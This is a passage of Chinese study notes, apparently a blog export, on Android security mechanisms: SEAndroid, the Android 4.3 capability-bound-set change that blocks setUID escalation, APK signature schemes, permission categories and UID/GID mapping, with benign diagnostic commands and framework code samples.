Web服务器的假想例子\nDAC模式下，Web服务器进程具有ROOT权限，当恶意病毒攻击成功并注入Web服务器进程后，则可以利用Web服务器进程的ROOT权限，做任何事情。\nMAC模式下：Web服务器进程所能操作的对象和权限均在安全策略中明确列出，比如，只允许访问网络和访问特定文件等。即便Web服务器被恶意病毒攻击注入了，你仍然无法借由Web服务器进程为所欲为，所有安全策略没有授权的行为仍然是不允许的。\n## SEAndroid\n* 与SELinux的关系\nSEAndroid (Security-Enhanced Android) 将原本运用在Linux上的SELinux技术移植到了Android平台上\n* 与SELinux的区别\n  除了移植SELinux以外，还做了很多针对Android的安全提高，比如把Binder IPC、Socket、Properites访问控制加入到了SEAndroid的控制中。\n* SEAndroid的核心理念\n  即使恶意应用篡得了ROOT权限，恶意应用仍然被优先的控制着仍然不能为所欲为。\n\n## Jelly Bean MR2（Android 4.3）的补丁（setUID 提权收紧）\n* 在 Android 4.3 之前，APK 进程能通过 `Runtime.exec()` 执行 **root-setUID** 二进制并提升 EUID。\n* 4.3 起，Zygote 在 fork 应用进程时**清空 Capability Bound Set**，使后续执行 setUID 文件时即使 EUID 改变，也**无实际 capability**可用。\n* 关键逻辑位于 Zygote 分支（Dalvik/ART 不同版本位置不同），等价于：\n```c\n// 伪代码：清空 PR_CAPBSET（capability bound set）\nfor (int i = 0; prctl(PR_CAPBSET_READ, i, 0, 0, 0) >= 0; i++) {\n    prctl(PR_CAPBSET_DROP, i, 0, 0, 0);\n}\n```\n* 结论：普通 APK 进程执行 root-setUID 二进制不再具备有效的 capability，无法借此获取特权。\n\n### JB MR2 细节（扩展版）\n**动机**  \n早期（4.2 及之前）APK 进程可通过 `Runtime.exec()`/`fork+exec` 执行带 **setUID-root** 位的二进制，从而把子进程的 **EUID 提升为 0**，再借助传统 root 权限做特权操作。为阻断这一途径，Android 4.3 在 Zygote 派生应用进程后，对 **Capability Bound Set（BSET）** 进行清空，使随后即便执行 setUID 文件，进程也**拿不到任何有效的 capability**。\n\n**内核前提**  \n* 依赖 Linux 的 **Capability Bounding Set** 机制（`prctl(PR_CAPBSET_DROP, cap)`）。  \n* 当某 capability 被从 BSET 中 drop 后，后续**不可再添加**到该进程的 Permitted 集（除非通过 exec 进入 `init`/更高权限环境，但普通 APK 不具备）。\n\n**Zygote 侧变化（伪代码）**  \n```c\n// 在 fork 普通应用进程后（进入 app uid/gid 环境前后），遍历所有 capability：\nfor (int cap = 0; prctl(PR_CAPBSET_READ, cap, 0, 0, 0) >= 0; ++cap) {\n    prctl(PR_CAPBSET_DROP, cap, 0, 0, 0);  // 将 BSET 清空\n}\n// 随后再 setresgid / setresuid 至应用 uid/gid，清空附属组等。\n// 注意：JB MR2 当时并**未**依赖 PR_SET_NO_NEW_PRIVS（较新内核才有），主要手段就是清空 BSET。\n```\n\n**能力传播公式回顾**  \n对一次 `execve(file)`，新的进程 capability 计算（简化）为：\n```\nP' = (P_inh & F_inh) | (F_perm & BSET)\nE' = F_eff ? P' : 0\nI' = P_inh   // 仅 Inheritable 可直接继承\n```\n* 其中 `F_*` 来自**目标可执行文件**的 capability，`P_*` 为**当前进程**；`BSET` 为 **Capability Bound Set**。\n* 当 **BSET = 0** 时，无论 `F_perm` 多大、`F_eff` 是否置位，`P'` 都只能来源于 `P_inh & F_inh`。而普通 APK 的 `P_inh` 默认为 0，故 `P' = 0`，`E' = 0`。\n\n**对 setUID-root 的具体影响**  \n* setUID 仍会令子进程的**EUID 变为 0**（身份层面），但由于 `P'=0`、`E'=0`，进程**没有任何有效 capability**，无法执行需要 capability 的特权操作（例如 `CAP_SYS_ADMIN`、`CAP_SYS_MODULE` 等）。\n* 这等价于：**“看起来像 root，实则无权”**，从根本上堵住了通过 setUID 提权的常见路径。\n\n**前/后对比（示例）**  \n* *JB MR2 之前（BSET=全 1）*：\n  - `F_eff=1`、`F_perm` 含若干能力 → `P'` 至少获得 `F_perm & BSET`，再赋给 `E'`，子进程具备相应特权。\n* *JB MR2 之后（BSET=0）*：\n  - 即便 `F_eff=1`，也因 `F_perm & 0 = 0` → `P'=0`、`E'=0`。\n\n**如何验证**  \n1. 在 APK 内部 `exec` 一个 setUID-root 的小程序：\n   ```shell\n   id; cat /proc/$$/status | egrep 'Uid:|Gid:|Cap(Inh|Prm|Eff)'\n   ```\n   可见 `Uid:` 的 `EUID` 为 0，但 `CapEff:` 为全 0。  \n2. 改为在 `adb shell`（root 环境）直接运行同一程序（不经 Zygote app 沙盒）对比其 `CapEff`，能观察到差异。\n\n**补充说明**  \n* 这一设计与后续版本中的 **SELinux（Enforcing）**、**权限拆分/前台服务限制** 等共同组成多层防护。  \n* 后续 Android/内核版本也引入了 `no_new_privs` 等手段，但 **JB MR2 的关键变化点就是清空 BSET**。\n\n捕鱼篇\n# 签名和权限\n## 移动平台中的主流签名作用：自签名的完整性鉴别\n* 什么是自签名\n  证书是用来证明公钥拥有者的身份信息，一般由可信的第三方机构颁发，三方机构用自己的私钥签名拥有者的公钥，从而证明该证书的有效性\n  证书的签名一般是由证书的颁发者的私钥签名\n  自签名指证书的签名者（机构）和证书拥有者（个体）是同一个实体\n  自签名即我自己的私钥签名我自己的公钥\n* 自签名的作用1：作为信任链的根证书\n  比如一个银行的公钥证书，由银行自己签名，银行自己颁发给自己，访问网上银行服务时，需要吧银行的根证书加入到系统中，从而信任该证书\n* 自签名的作用2：完整性鉴别 \n\n## 移动平台中的主流签名作用：信任模式\n* 何为可信任？\n  我写的应用？\n  我信任的哥们写的应用？\n\n* 如何鉴别可信任\n  签名了？\n  签名是可信的？（证书、证书回溯）\n\n* 可信任和普通应用的权利差异\n  人为的把一些Operation归类\n  某类Operation对于可信任应用和普通应用的表现不一样\n* 一些例子\n  系统应用使用系统特权不需要用户弹窗授权\n## 移动平台中的主流签名作用：限制安装/运行\n* 应用安装时\n  是否包含签名？----》没有？禁止安装\n  提取证书进行验证----》证书是有效且可信的？----》不是？禁止安装\n  基于证书的公钥对签名进行验证----》签名验证通过？----》不是？禁止安装\n* 应用运行某些特殊代码（特权）时\n  是否包含签名？----》没有？禁止运行\n  提取证书进行验证----》证书是有效且可信的？----》不是？禁止运行\n  基于证书的公钥对签名进行验证----》签名验证通过？----》不是？禁止运行\n## 权限的作用：细粒度的特权管理\n* 权限是一个ID或者一个字符串\n* 权限用来细分权利（类似Capability）\n* 通常一个权限与一类操作绑定\n* 权限首先需要申请\n* 但是申请后是否被批准由平台策略决定\n* 例子1：应用读写SDCARD\n* 例子2：应用reset手机\n## 权限的安全性保护：通过签名\n* 权限的完整性保护：防篡改\n  例子（通过认证并获得签名后再加policy权限）\n  实现方式：签名对（code+权限）完整性保护 ，如果权限被篡改，签名校验失败，拒绝执行\n* 权限的授权安全策略：防Escalate\n  例子（普通应用申请Inject Event权限）\n  实现方式，即使用户申请了，也不能获得，因为签名不是系统的签名，所以不授予权限\n  \n## 回顾和总结\n\n# Android中的签名\n## Android的签名作用：完整性鉴别\n* 支持自签名用于完整行鉴别\n* 不做信任模式\n* 不做安装和运行时的限制,即不限制证书是否是可信的\n## Android的签名作用：Signature Permissions 和 ShareUID\n* Signature Protected Level Permissions\n  用于特权Permission\n  只有特定签名的APK才被授权\n```xml\n      <!-- @SystemApi Allows access to hardware peripherals.  Intended only for hardware testing.\n         <p>Not for use by third-party applications.\n         @hide\n    -->\n    <permission android:name=\"android.permission.HARDWARE_TEST\"\n        android:protectionLevel=\"signature\" />\n ```\n* Share Process UID android:sharedUserId=\"xxxx\"\n  Process间Share UID的目的是共享资源等\n  Android中两个APK Share相同的UID必须其签名所用的Private Key一样（为什么）\n  如果shareUID相同，A可以访问B中的data/data下的资源\n  android11 shareUID不再支持，因为它破坏了应用沙盒的安全模型，使得应用间的隔离变得复杂。\n## Android的签名作用：身份ID和升级的匹配\n* Android中的自签名只是代表了身份，但不代表身份是否可信任\n* Android的应用的Identifier是Package Name:\n  Package Name 不一样，互相不影响，允许同时存在（安装）\n  Package Name 一样，只能存在一个，允许做升级处理\n* 升级的安全性考虑\n  必须签名的证书一致（防假冒，防侵入隐私）\n  如果不一致，则用户要么放弃新的应用，要么先卸载旧的，再安装新的。但这属于安装，不属于升级\n  正常的升级不擦除应用的工作目录数据，以保证历史数据的持续性\n## AndroidAPK之META INF\n* APK结构\n* META INF的组成\n*   •\tAndroid 7.0 (Nougat) 开始支持 v2 签名（APK Signature Scheme v2），之后又有 v3/v4。\n\t•\t使用 v2/v3/v4 签名时，可以不再包含 CERT.RSA、CERT.SF、MANIFEST.MF 文件，因为签名数据存储在 APK 尾部的 Signing Block 里。\n**APK Signature Scheme 现状（2025）**\n* **v1（JAR 签名）**：只保护单个条目；Android 7.0+ 仍支持但已不推荐，易被 zipalign 等修改破坏。\n* **v2**：签名数据位于 APK **Signing Block**；显著加速安装校验，允许不再包含 `CERT.RSA/ CERT.SF/ MANIFEST.MF`。\n* **v3**：在 v2 基础上支持**密钥轮换（Proof-of-rotation）**；升级时可更换签名密钥并建立信任链。\n* **v4**：为**增量安装/分发**设计，搭配 v2/v3 使用，主要由安装器消费。\n* 校验命令：\n```shell\napksigner verify -v --print-certs your.apk\n```\n* Play 商店上架要求：应使用 v2+（新应用一般要求 v3），仅 v1 可能被拒。\n* 签名流程\n  PrivateKey(hash(CERT.SF)) => CERT.RSA\n## 回顾和总结\n\n # Android中的权限\n## 近年权限与隐私重大变化（Android 10~15 摘要）\n1) **分区存储 Scoped Storage**（Android 10/11）\n* 外部存储访问被沙箱化；`READ/WRITE_EXTERNAL_STORAGE` 逐步被弱化。\n* Android 11 起提供 **MANAGE_EXTERNAL_STORAGE**（极度敏感，仅少量场景允许）。\n* 媒体访问细分为：`READ_MEDIA_IMAGES` / `READ_MEDIA_VIDEO` / `READ_MEDIA_AUDIO`（Android 13+），以及 **选择性访问** `READ_MEDIA_VISUAL_USER_SELECTED`（Android 14/15）。\n\n2) **包可见性（Package Visibility）**（Android 11）\n* 默认**无法枚举**系统上安装的其他包。\n* 需要在 `AndroidManifest.xml` 中声明：\n```xml\n<queries>\n    <package android:name=\"com.example.target\" />\n    <intent>\n        <action android:name=\"android.intent.action.VIEW\" />\n        <data android:scheme=\"https\" />\n    </intent>\n</queries>\n```\n\n3) **运行时权限拆分与新增**\n* Android 12：蓝牙权限改为运行时 `BLUETOOTH_CONNECT/SCAN/ADVERTISE`，并引入 **NEARBY_DEVICES** 场景限制。\n* Android 12：位置支持**近似/精确**；用户可仅授予近似位置。\n* Android 13：**通知权限** `POST_NOTIFICATIONS` 改为运行时授权。\n* Android 14/15：健康/传感器、后台权限进一步收紧（例如 `BODY_SENSORS_BACKGROUND` 需额外审查）。\n\n4) **前台服务（FGS）与后台限制**\n* Android 12 起要求声明 **前台服务类型**（`type=\"location|mediaPlayback|connectedDevice|dataSync|camera|microphone|health\"` 等）。\n* Android 14/15 对**后台启动 FGS**、超时与并发数量更严格；建议改用 **WorkManager + 明确的 FGS 类型**。\n\n5) **精确闹钟**\n* Android 13 引入 `USE_EXACT_ALARM`；Android 14/15 对非闹钟类 App 更**严格限制**，需合规理由与设置跳转。\n\n6) **照片选择器（Photo Picker）**（Android 13+）\n* 无需存储权限即可让用户选择媒体；优先使用系统 Photo Picker 替代自建文件选择。\n\n7) **PendingIntent 可变性**\n* Android 12 要求显式设置 `FLAG_IMMUTABLE` 或 `FLAG_MUTABLE`，默认不再安全。\n\n8) **签名权限与 privapp 权限**\n* 大量历史 `signatureOrSystem` 权限被收紧为 `signature`；OEM 侧须通过 `privapp-permissions` 白名单并配套签名。\n## Android的权限作用：细粒度特权管理\n* 权限与操作关联\n  android不支持隐式申请权限，即使是系统应用，也需要显式申请权限\n* 应用需要显式申请权限\n* 用户对权限可知（不可控），\n  现在可控（厂商处理）\n* 对特权权限单独控制\n## Android的不同权限类别\n在 Android 中，**权限（Permission）**按作用范围和敏感程度可以分为几个主要类别。下面给为一个体系化梳理：\n⸻\n1. 普通权限 (Normal Permissions)\n\t•\t特点：涉及用户隐私风险较小，系统会在安装时自动授予。\n\t•\t示例：\n\t•\tINTERNET：访问网络\n\t•\tACCESS_NETWORK_STATE：获取网络状态\n\t•\tSET_WALLPAPER：设置壁纸\n⸻\n2. 危险权限 (Dangerous Permissions)\n\t•\t特点：涉及用户隐私或设备安全，必须 运行时动态申请（Android 6.0+）。\n\t•\t按权限组分类（常见组）：\n\t•\t日历 (CALENDAR)\n\t•\tREAD_CALENDAR、WRITE_CALENDAR\n\t•\t相机 (CAMERA)\n\t•\tCAMERA\n\t•\t联系人 (CONTACTS)\n\t•\tREAD_CONTACTS、WRITE_CONTACTS、GET_ACCOUNTS\n\t•\t位置 (LOCATION)\n\t•\tACCESS_FINE_LOCATION、ACCESS_COARSE_LOCATION\n\t•\t麦克风 (MICROPHONE)\n\t•\tRECORD_AUDIO\n\t•\t电话 (PHONE)\n\t•\tREAD_PHONE_STATE、CALL_PHONE、READ_CALL_LOG、WRITE_CALL_LOG、ADD_VOICEMAIL、USE_SIP、PROCESS_OUTGOING_CALLS\n\t•\t传感器 (SENSORS)\n\t•\tBODY_SENSORS\n\t•\t短信 (SMS)\n\t•\tSEND_SMS、RECEIVE_SMS、READ_SMS、RECEIVE_WAP_PUSH、RECEIVE_MMS\n\t•\t存储 (STORAGE)\n\t•\tREAD_EXTERNAL_STORAGE、WRITE_EXTERNAL_STORAGE\n⸻\n3. 签名权限 (Signature Permissions)\n\t•\t特点：只有当 请求权限的应用 和 声明权限的应用 使用相同的签名证书时，才能授予。\n\t•\t应用场景：系统应用间的私有接口调用。\n\t•\t示例：\n\t•\tINSTALL_PACKAGES（安装 APK）\n\t•\tDELETE_PACKAGES（卸载 APK）\n⸻\n4. 签名或系统权限 (SignatureOrSystem Permissions)\n\t•\t特点：Android 5.0 以前允许系统预装应用（放在 /system/app）或相同签名应用使用。\n\t•\t状态：Android 6.0 开始逐渐废弃，很多权限被收紧为 Signature-only。\n\t•\t示例（老系统才有效）：\n\t•\tWRITE_SETTINGS\n\t•\tCHANGE_CONFIGURATION\n⸻\n5. 特殊权限 (Special Permissions)\n这些不属于普通危险权限，需要通过 特殊 API 或系统设置界面 授权。\n\t•\tSYSTEM_ALERT_WINDOW（悬浮窗权限）\n\t•\t通过 Settings.canDrawOverlays() 检查\n\t•\tWRITE_SETTINGS（修改系统设置）\n\t•\t通过 Settings.System.canWrite() 检查\n\t•\tREQUEST_INSTALL_PACKAGES（允许安装未知来源的 APK）\n\t•\tAndroid 8.0 引入\n\t•\tMANAGE_EXTERNAL_STORAGE（管理所有文件）\n\t•\tAndroid 11 引入，替代传统的存储权限\n\t•\tUSE_FULL_SCREEN_INTENT（高优先级通知）\n\t•\tAndroid 10 引入\n⸻\n6. 受限制权限 (Restricted Permissions, Android 10+)\n\t•\t特点：Google 逐步收紧一些权限的使用，需要 Google 审核/声明特殊用途 才能上架 Play。\n\t•\t示例：\n\t•\tREAD_SMS、SEND_SMS（敏感通讯权限）\n\t•\tREAD_CALL_LOG、WRITE_CALL_LOG\n\t•\tACCESS_BACKGROUND_LOCATION（后台定位权限，Android 10+ 严格限制）\n⸻\n✅ 总结：Android 权限主要分为：\n\t•\t普通权限（自动授予）\n\t•\t危险权限（需要运行时授权）\n\t•\t签名/签名或系统权限（系统或签名一致才可用）\n\t•\t特殊权限（需要通过系统设置授权）\n\t•\t受限制权限（Google 审核，敏感程度高）\n## Android的平台权限定义\n  定义在AndroidManifest.xml中\nAndroid 的权限本质上就是字符串常量，统一定义在 frameworks/base/core/res/AndroidManifest.xml 里。\n这是系统框架的清单文件，其中包含了所有系统预定义权限，例如：\n```xml\n<permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\"\n    android:protectionLevel=\"dangerous\" />\n<permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"\n    android:protectionLevel=\"dangerous\" />\n```\n当在Application中 AndroidManifest.xml 里写：\n```xml\n<uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/>\n```\n就使用了这个权限，但是必须动态申请。\n\n> 提示：从 Android 13 起，媒体读取权限按类型细分；从 Android 11 起，**`WRITE_EXTERNAL_STORAGE` 基本被废弃**，请改用 `MediaStore` + 具体媒体权限或 Photo Picker。\n\n## Android的运行时权限控制方式：通过PM的CheckPermission\n* Android独有的Service（底层平台不具有）\n* 所以需要在Android本身Framework中控制\n* 主流的Service一般都是基于Binder IPC或者其他IPC提供服务\n* 所以在最低层控制（Service所在的service可执行文件 run中）以避免逃逸控制\n  绕开Utility Function直接invoke Remote Service\n  所以要在service run中进行控制\n* 例子 DayDream\n```java\nvoid startDockOrHome(){\n  awakenDreams();\n  Intent dock = createDockIntent();\n  if(dock != null){\n    try{\n      mContext.startActivityAsUser(dock,UserHandle.CURRENT);\n      return;\n    }catch(ActivityNotFoundException e){\n    }\n\n    private static void awakenDreams(){\n      IDreamManager dreamManager = getDreamManager();\n      if(dreamManager != null){\n        try{\n          dreamManager.awaken();\n        }catch(RemoteException e){\n          //fine,stay asleep then\n        }\n      }    \n      }\n  }\n}\n\nstatic IDreamManager getDreamManager(){\n  return IDreamManager.Stub.asInterface(ServiceManager.checkService(DreamService.DREAM_SERVICE));\n}\n\n@Override //Binder call\npublic void awaken(){\n  checkPermission(android.Manifest.permission.WRITE_DREAM_STATE);\n  final long ident = Binder.clearCallingIdentity();\n  try{}\n}\n\nprivate void checkPermission(String permission){\n  if(mContext.checkCallingOrSelfPermission(permission) != PackageManager.PERMISSION_GRANTED){\n    throw new SecurityException(\"Access denied to process: \" + Binder.getCallingPid()+\", must have permission \" + permission);\n  }\n}\n```\n\n> 生产代码建议：在 **Binder 端（服务实现）**做二次校验（`checkCallingPermission()` / `enforceCallingPermission()`），避免调用方绕过客户端封装直接发起 IPC。\n\n## Android的运行是权限控制方式：映射为OS的特定属性\n* 非Android特有的Service（底层平台已经提供，如File访问，TCPIP数据首发等）\n* 多个入口访问：Android API , Java API ,NDK C API ,Shell ,etc\n* 底层控制准则，会聚口在底层，所以在底层（OS层面）统一控制，这样可以避免逃逸控制\n* 所以复用OS的一些安全控制特性，比如GID\n* 所以需要把Android空间的Permission Mapping到OS的GID\n* 例子：访问SDCard\n  sdcard目录下的文件权限如下所示：\n```shell\n# 外部存储挂载示例（不同设备存在差异）\nmarlin:/ $ ls -l /storage\ntotal 8\ndrwx--x--x 3 root sdcard_rw 4096 2025-09-01 21:59 emulated\ndrwxr-xr-x 2 root root        60 1974-12-07 14:35 self\n# 进程通过所属 GID（如 sdcard_rw / media_rw）与 FUSE/SDCardFS/FS-verity 等层配合受控访问\n```\n\n## Android的Permission与UID/GID的mapping\n\n# Android 专题补充（2025）\n## AID 与多用户 UID 计算\n* `appId` 从 10000 起分配；多用户下 `uid = userId * 100000 + appId`。\n* 典型系统 AID：`AID_SYSTEM=1000`、`AID_RADIO=1001`、`AID_BLUETOOTH=1002`、`AID_GRAPHICS=1003` 等（详见 `android_filesystem_config.h`）。\n\n## SELinux（SEAndroid）要点\n* 强制访问控制（MAC）默认 **Enforcing**；检查：`getenforce`。\n* App 进程运行在诸如 `u:object_r:app_data_file:s0:cXX,cYY`（文件）与 `u:r:untrusted_app:s0:cXX,cYY`（进程域）之下；越权访问由策略阻断。\n* 调试常用：`adb shell dmesg | grep avc:`、`adb logcat | grep denied` 定位策略拒绝。\n\n## 调试与自检清单\n* 查看进程身份与能力：`ps -eo pid,ruid,euid,rgid,egid,user,comm`; `cat /proc/$PID/status`。\n* 查看签名方案与证书：`apksigner verify -v --print-certs your.apk`。\n* 遵循现代权限：优先 Photo Picker / MediaStore；声明 `queries`；细化 FGS 类型；声明 PendingIntent 可变性；最小权限原则。\n","slug":"android_safe","published":0,"date":"2025-07-12T10:00:10.197Z","updated":"2025-09-01T14:00:03.624Z","_id":"cmd44risy0005v8fy7y5a1pxy","title":"","comments":1,"layout":"post","photos":[],"link":"","content":"<blockquote>\n<p>本笔记为安全体系与 Android 平台权限/签名机制速记。<strong>最近一次校对：2025-09（基于 Android 15 / API 35 现状）</strong>。文末与相关章节已补充近年重要变更：APK 签名 v2/v3/v4、分区存储、包可见性、运行时权限调整、前台服务限制、精确闹钟权限等。</p>\n</blockquote>\n<p>扎绳篇：<br>非对称密码 公钥体系<br>证书<br>包含公钥，公钥是利用证书来传递的</p>\n<p>利用签名来保护数字证书本身</p>\n<p>人的信任关系：一个信任人的列表<br>数字时代的信任关系：一个受信任者的证书列表</p>\n<p>人的信任链：孔子-》孔子的徒弟-》孔子的徒弟的徒弟<br>数字时代的信任链：证书链<br>证书签名的不同点：根证书自签名，非根证书父签名<br>证书的限制：<br>    约束<br>    用途<br>    有效期<br>PKI的概念</p>\n<p>基于可信任证书的认证方式被广泛的应用在现代安全领域，比如WIFI，HTTPS<br>在HTTPS中，典型的Client对Server的认证和鉴别基于可信任列表<br>织网篇:</p>\n<h1 id=\"进程和进程边界\"><a href=\"#进程和进程边界\" class=\"headerlink\" title=\"进程和进程边界\"></a>进程和进程边界</h1><h2 id=\"进程和线程\"><a href=\"#进程和线程\" class=\"headerlink\" title=\"进程和线程\"></a>进程和线程</h2><p>可执行文件：不活动就是废物<br>进程：可执行文件的活动表现，一次生命的历练，资源的最小单位<br>线程：CPU(核)的调度单位,并发的执行序列，进程的多管齐下<br>资源和调度</p>\n<h2 id=\"手机操作系统的发展\"><a href=\"#手机操作系统的发展\" class=\"headerlink\" title=\"手机操作系统的发展\"></a>手机操作系统的发展</h2><p>Feature Phone 时代的实时简单的单进程多任务非智能系统<br>Smart Phone 时代的多进程多任务智能系统</p>\n<h2 id=\"进程的地址空间边界\"><a href=\"#进程的地址空间边界\" class=\"headerlink\" title=\"进程的地址空间边界\"></a>进程的地址空间边界</h2><p>每个进程的虚拟地址空间0-4G（32位），每个进程的物理地址空间是独立的</p>\n<h2 id=\"进程边界的安全围栏：Crash的不可扩展性\"><a href=\"#进程边界的安全围栏：Crash的不可扩展性\" class=\"headerlink\" title=\"进程边界的安全围栏：Crash的不可扩展性\"></a>进程边界的安全围栏：Crash的不可扩展性</h2><h2 id=\"进程边界的安全围栏：全局数据和服务的不可访问性\"><a href=\"#进程边界的安全围栏：全局数据和服务的不可访问性\" class=\"headerlink\" title=\"进程边界的安全围栏：全局数据和服务的不可访问性\"></a>进程边界的安全围栏：全局数据和服务的不可访问性</h2><p>回顾和总结</p>\n<h1 id=\"多用户和多用户边界\"><a href=\"#多用户和多用户边界\" class=\"headerlink\" title=\"多用户和多用户边界\"></a>多用户和多用户边界</h1><h2 id=\"需求背景\"><a href=\"#需求背景\" class=\"headerlink\" title=\"需求背景\"></a>需求背景</h2><p>资源缺乏<br>中央统一管理</p>\n<h2 id=\"多用户的边界：独立的工作目录\"><a href=\"#多用户的边界：独立的工作目录\" class=\"headerlink\" title=\"多用户的边界：独立的工作目录\"></a>多用户的边界：独立的工作目录</h2><p>独立的老巢<br>/home/nuoen</p>\n<h2 id=\"多用户的边界：可操作-访问的资源\"><a href=\"#多用户的边界：可操作-访问的资源\" class=\"headerlink\" title=\"多用户的边界：可操作/访问的资源\"></a>多用户的边界：可操作/访问的资源</h2><p>资源分类<br>权限管理</p>\n<h2 id=\"多用户的边界：可执行的操作\"><a href=\"#多用户的边界：可执行的操作\" class=\"headerlink\" title=\"多用户的边界：可执行的操作\"></a>多用户的边界：可执行的操作</h2><p>操作分类<br>权限管理</p>\n<h2 id=\"多用户的边界：UID和GID\"><a href=\"#多用户的边界：UID和GID\" class=\"headerlink\" title=\"多用户的边界：UID和GID\"></a>多用户的边界：UID和GID</h2><p>Name只是供看的<br>Identifier才是系统层面的标识<br>用户的行为是一系列进程的行为<br>特性标识其实是进程的UID/GID</p>\n<h1 id=\"进程和文件的UID-GID\"><a href=\"#进程和文件的UID-GID\" class=\"headerlink\" title=\"进程和文件的UID/GID\"></a>进程和文件的UID/GID</h1><h2 id=\"文件资源的权限力度：UID-GID\"><a href=\"#文件资源的权限力度：UID-GID\" class=\"headerlink\" title=\"文件资源的权限力度：UID/GID\"></a>文件资源的权限力度：UID/GID</h2><ul>\n<li>文件是一种资源</li>\n<li>在Linux中，甚至一切皆是文件，Socket,Driver</li>\n<li>文件资源对不同Target(用户)的不同操作权限的需求应运而生</li>\n<li>如何描述和区分不同的target? ID=====》UID===》唯一的</li>\n<li>某些场景下，允许多个不同的Target/用户 (而不是一个)具有一致的操作权限，怎么办？ID—-&gt;GID—-&gt;多个用户可以属于一个GID，一个用户可以属于多个GIDs</li>\n<li>所以文件权限的管理力度区分为3类群体：属于特定UID的用户，属于特定GID的用户（们），其他用户</li>\n<li>一个上帝用户存在：ROOT，其UID=0，上帝用户永远满足属于任何UID<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ps -eo pid,uid,gid,user,args</span><br></pre></td></tr></table></figure>\n<h2 id=\"文件的可操作权限\"><a href=\"#文件的可操作权限\" class=\"headerlink\" title=\"文件的可操作权限\"></a>文件的可操作权限</h2>文件/文件夹的可读<br>文件/文件夹的可写<br>文件/文件夹的可执行<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls -l </span><br><span class=\"line\">是否是文件夹|Owner用户权限|非Owner用户但是相同的组用户权限|既不是Owner用户也不是相同组的用户权限</span><br><span class=\"line\">*|***|***|***   UID  GID</span><br><span class=\"line\">drwxr-xr-x  2 root  root        4096 Apr 22  2024  mnt</span><br><span class=\"line\">drwxrwxr-x 29 nuoen nuoen       4096 Jun  7 04:55  msm</span><br><span class=\"line\">-rw-------  1 nuoen nuoen          0 May 20 11:20  nohup.out</span><br></pre></td></tr></table></figure>\n<h2 id=\"进程的标识：PID-UID-GID-GIDs\"><a href=\"#进程的标识：PID-UID-GID-GIDs\" class=\"headerlink\" title=\"进程的标识：PID,UID,GID,GIDs\"></a>进程的标识：PID,UID,GID,GIDs</h2>PID:进程的Unique Identifier。每次Running的PID可能相同，或者不同，由系统分配<br>UID:进程的身份标识。每次运行，即便重启后默认都相同。不同进程允许有相同的UID(用户身份标识)<br>GID:进程的（组）身份标识。每次运行，即便重启后默认都相同。不同进程允许有相同的GID(组用户身份标识)。同一进程允许属于多个GID<br>GIDs:进程所属的全部GID</li>\n</ul>\n<h2 id=\"Name-和-ID的映射\"><a href=\"#Name-和-ID的映射\" class=\"headerlink\" title=\"Name 和 ID的映射\"></a>Name 和 ID的映射</h2><p>android_filesystem_config.h</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* This is the master Users and Groups config for the platform.</span></span><br><span class=\"line\"><span class=\"comment\"> * DO NOT EVER RENUMBER</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_ROOT 0 <span class=\"comment\">/* traditional unix root user */</span></span></span><br><span class=\"line\"><span class=\"comment\">/* The following are for LTP and should only be used for testing */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_DAEMON 1 <span class=\"comment\">/* traditional unix daemon owner */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_BIN 2    <span class=\"comment\">/* traditional unix binaries owner */</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_SYSTEM 1000 <span class=\"comment\">/* system server */</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_RADIO 1001           <span class=\"comment\">/* telephony subsystem, RIL */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_BLUETOOTH 1002       <span class=\"comment\">/* bluetooth subsystem */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_GRAPHICS 1003        <span class=\"comment\">/* graphics devices */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_INPUT 1004           <span class=\"comment\">/* input devices */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_AUDIO 1005           <span class=\"comment\">/* audio devices */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_CAMERA 1006          <span class=\"comment\">/* camera devices */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AID_LOG 1007             <span class=\"comment\">/* log devices */</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* The 3000 series are intended for use as supplemental group id&#x27;s only.</span></span><br><span class=\"line\"><span class=\"comment\"> * 